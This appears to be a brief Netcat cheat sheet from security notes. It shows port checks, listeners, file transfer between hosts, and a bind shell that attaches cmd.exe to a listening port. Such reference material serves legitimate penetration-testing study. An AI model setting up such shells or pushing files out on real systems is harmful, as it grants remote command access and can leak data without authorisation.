# Netcat

Check if a TCP port is open :&#x20;

```
nc -nv <ip> <port>
```

* \-n : Skip DNS name resolution
* \-v : Add some verbosity

Listening on a TCP/UDP port

```
nc -nlvp <port>
```

* \-n : Skip DNS name resolution
* \-l : Create a listener
* \-v : Add some verbosity
* \-p : Specify the listening port number

Transferring Files

1 - Set up a Netcat listener on a port and redirect any output into a file

```
nc -nlvp <port> > file.txt
```

2 - Push the file through the TCP port

```
nc -nv <ip> <port> < /tmp/file_to_transfert.txt
```

Bind shell

1 - Set up a Netcat listener on a port&#x20;

```
nc -nlvp <port> -e cmd.exe
```

* \-e : Executes a program after making or receiving a successful connection

2 - Connect to the TCP port

```
nc -nv <ip> <port>
```
